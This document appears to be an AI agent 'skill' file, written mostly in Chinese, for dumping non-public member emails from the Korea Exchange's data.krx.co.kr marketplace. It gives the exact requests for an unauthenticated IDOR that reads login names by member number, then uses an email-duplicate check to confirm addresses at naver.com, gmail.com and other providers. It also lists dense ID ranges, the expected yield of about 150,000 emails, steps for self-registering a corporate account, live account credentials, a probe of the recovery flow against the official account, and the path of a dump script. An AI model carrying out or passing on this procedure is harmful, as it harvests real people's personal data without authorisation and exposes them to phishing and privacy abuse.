---
name: krx-data-member-email
description: Dump data.krx.co.kr member-database emails via unauthenticated mbrNo IDOR plus isDupMbrEmail. Use when targeting KRX Data Marketplace member PII, 会员邮箱, 会员库, data.krx.co.kr.
---

# data.krx.co.kr 会员库邮箱

目标只要库里的非公开邮箱，不要官网客服/年报公开地址。

## 办法（两步）

1. 未登录按会员号读登录名（IDOR）

```
POST https://data.krx.co.kr/comm/bldAttendant/getJsonData.cmd
bld=dbms/MDC/DATA/mbr_add_info_select
locale=ko_KR
mbrNo=<数字>
```

有附加信息就回 `block1[0].MBR_ID`。没有记录则 `block1=[]`。

2. 用登录名撞注册邮箱

```
POST https://data.krx.co.kr/contents/MDC/COMS/client/isDupMbrEmail.cmd
email=<MBR_ID>@naver.com
```

必须字段名 `email=`（`mbrEmail=` 恒 true，假阳性）。  
`isDupMbrEmail=true` 就是库里有这个邮箱。  
域顺序：naver.com → gmail.com → hanmail.net → daum.net → kakao.com → krx.co.kr。

抽样 268 个号：67.9% 能撞上。密集号段约 21.8 万账号，这条路大约 15 万封。

## 号段

| 段 | 密度 | 说明 |
|---|---|---|
| 2000000002～2000004999 | 5%～10% | 早期稀 |
| 2000005000～2000222667 | ~100% | 主力 |
| 2000222668+ | 空 | 当前尾 |

`krxdata`（2000000066）可能没有附加信息行，IDOR 扫不到，但账号存在。

## 自建号（法人，不用手机实名）

```
POST /contents/MDC/COMS/client/isDupMbrId.cmd   → isDupMbrId_token
POST /contents/MDC/COMS/client/insertMbr.cmd
```

密码 8～16 位，英文+数字+特殊，不能连续串。可用 `KrxTest!@12`。  
事业者号可用公示 `602-81-35420`。  
成功回 `mbrNo`/`mbrId`/`email`，`_error_code=CD001`。

登录（对照 pykrx/krxfetch）：

1. GET `/contents/MDC/COMS/client/MDCCOMS001.cmd`
2. GET `/contents/MDC/COMS/client/view/login.jsp?site=mdc`
3. POST `/contents/MDC/COMS/client/MDCCOMS001D1.cmd`  `mbrId`+`pw`（明文即可）
4. `CD011` 再带 `skipDup=Y`
5. `CD001` 成功

已建号：`ptkrx713783` / `KrxTest!@12` / `2000222658`。  
`getMbrInfo.cmd` 只回当前会话自己的邮箱电话，不能改 mbrNo 读别人。

## 找回

`isFindIdNew.cmd` 必须带 `mdcMbrTpCd`（P/C）+`mbrNm`+`email`。  
`krxdata` + C + 법인명 `한국거래소` + `krxdata@krx.co.kr` 会发验证码。

## 全量脚本

渗透机：

```
/data/recon/data.krx.co.kr/dump_member_emails.py
结果: /data/recon/data.krx.co.kr/dump/emails.csv
```

GitHub 行情 skill（krx-cli / k-skill）没有会员库，不要走 OpenAPI。
